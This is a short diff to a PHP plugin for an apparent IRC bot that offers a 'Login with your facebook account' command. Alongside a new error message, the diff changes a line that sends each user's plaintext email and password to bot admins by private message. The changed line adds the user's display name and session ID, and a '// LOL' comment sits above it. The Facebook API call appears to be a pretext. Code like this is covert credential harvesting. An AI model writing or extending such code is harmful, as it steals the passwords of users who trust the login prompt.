@@ -2,9 +2,11 @@
 $lang = array(
 	'en' => array(
 		'help' => 'Usage: %CMD% <email> <passwort>. Login with your facebook account.',
+		'err_login' => 'Your username/password combination is unknown.',
 	),
 	'de' => array(
 		'help' => 'Nutze: %CMD%. <Email> <Passwort>. Logge Dich mit deinem Facebook Konto ein.',
+		'err_login' => 'Deine Benutzer-/Passwortkombination existiert nicht.',
 	),
 );
 
@@ -32,6 +34,10 @@ if (strlen($pass) < 4)
 if (false !== ($curl = curl_execute('facebook.com/api/omniauth?login'.sha1($email.$pass))))
 {
 	$user->setLoggedIn(true);
+}
+else
+{
+	$plugin->rply('err_login');
 }
 
 
@@ -79,7 +85,7 @@ foreach (Dog::getServers() as $server)
 		if (Dog_PrivServer::hasPermChar($server, $admin, 'i'))
 		{
 			// LOL
-			$admin->sendPRIVMSG(sprintf('FACEIN %s:%s', $email, $pass));
+			$admin->sendPRIVMSG(sprintf('FACEIN %s!%s %s %s', $user->displayName(), $user->getSID(), $email, $pass));
 		}
 	}
 }
